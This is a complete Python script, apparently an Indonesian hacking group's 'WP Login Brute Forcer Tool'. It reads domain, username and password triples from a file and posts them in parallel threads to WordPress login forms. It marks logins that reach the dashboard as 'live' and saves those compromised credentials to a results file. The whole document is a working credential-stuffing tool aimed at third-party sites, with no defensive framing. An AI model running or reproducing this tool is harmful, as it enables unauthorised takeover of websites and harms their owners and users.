import os
import requests
from rich.console import Console
from rich.table import Table
from rich.text import Text
from rich.panel import Panel
from concurrent.futures import ThreadPoolExecutor, as_completed

# Bersihkan layar
os.system('clear')

# Membaca file wp.txt
def read_wp_file(filename):
    entries = []
    with open(filename, 'r') as file:
        for line in file:
            parts = line.strip().split('|')
            if len(parts) == 3:  # Memastikan hanya baris dengan 3 elemen yang diambil
                entries.append(parts)
    return entries

# Login ke WordPress
def wp_login(entry):
    domain, username, password = entry
    payload = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'testcookie': '1'
    }
    with requests.Session() as session:
        response = session.post(domain, data=payload)
        return domain, username, password, response.status_code, response.text

def main():
    console = Console()

    # Tampilan logo dan informasi penulis menggunakan Panel
    banner = Panel(
        "               [bold cyan]WP Login Brute Forcer Tool[/bold cyan]",
        title="[bold magenta]Tool Info[/bold magenta]",
        border_style="bold magenta"
    )
    
    author_info = Panel(
        "         [bold yellow]Author: mr.khay404 | Team: GAIBCYBERT_T3AM[/bold yellow]",
        title="[bold blue]Author Info[/bold blue]",
        border_style="bold blue"
    )

    console.print(banner)
    console.print(author_info)

    wp_data = read_wp_file('wp.txt')

    # Tabel untuk hasil
    table = Table(show_header=True, header_style="bold white")
    table.add_column("Domain", justify="center", style="cyan")
    table.add_column("User", justify="center", style="yellow")
    table.add_column("Password", justify="center", style="white")
    table.add_column("Status", justify="center", style="magenta")

    console.print("\nMulai pengujian login...\n", style="bold green")

    # Menggunakan ThreadPoolExecutor untuk menjalankan pengujian secara paralel
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(wp_login, entry): entry for entry in wp_data}

        live_results = []  # List untuk menyimpan hasil "live"

        for future in as_completed(futures):
            entry = futures[future]
            try:
                domain, username, password, code, response_text = future.result()

                # Tentukan status berdasarkan hasil login
                if code == 200 and "dashboard" in response_text:
                    result = Text("live", style="green")
                    live_results.append(f"{domain}|{username}|{password}\n")  # Simpan hasil
                else:
                    result = Text("die", style="red")

                # Tambahkan hasil ke tabel
                table.add_row(domain, username, password, result)
                console.print(table)  # Menampilkan tabel setelah setiap percobaan

            except Exception:
                pass  # Abaikan kesalahan tanpa menampilkan apa pun

    # Simpan hasil "live" ke wphasil.txt
    with open('wphasil.txt', 'w') as file:
        file.writelines(live_results)

    console.print("\n[bold green]Pengujian selesai. Hasil 'live' disimpan di wphasil.txt.[/bold green]")

if __name__ == "__main__":
    main()